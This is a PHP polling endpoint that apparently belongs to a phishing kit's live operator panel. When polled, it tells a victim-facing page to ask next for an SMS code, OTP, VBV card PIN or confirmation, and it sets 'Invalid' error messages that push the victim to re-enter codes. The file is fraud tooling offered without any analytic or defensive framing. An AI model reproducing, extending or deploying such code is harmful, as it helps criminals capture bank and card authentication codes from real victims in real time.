<?php 
require_once 'config/panel.php';
require_once "model/app.php";

// Start the session if it's not already started
session_start();

if(isset($_GET['waiting']) && $_GET['waiting'] == 1) {
    $response = response();
    if($response === 'sms') {
        echo 'sms';
        exit(); 
    } else if($response === 'badsms') {
        $_SESSION['ERRORS']['sms'] = "Invalid SMS.";
        echo 'sms';
        exit();
    } else if($response === 'otp') {
        echo 'otp';
        exit();
    }
    else if($response === 'badotp') {
        $_SESSION['ERRORS']['otp'] = "Invalid OTP.";
        echo 'otp';
        exit();
    }
    else if($response === 'vbv') {
        echo 'vbv';
        exit();
    }
    else if($response === 'badvbv') {
        $_SESSION['ERRORS']['pin'] = "Invalid VBV.";
        echo 'vbv';
        exit();
    }
    else if($response === 'confirm') {
        echo 'confirm';
        exit();
    }
    echo '';
    exit();
}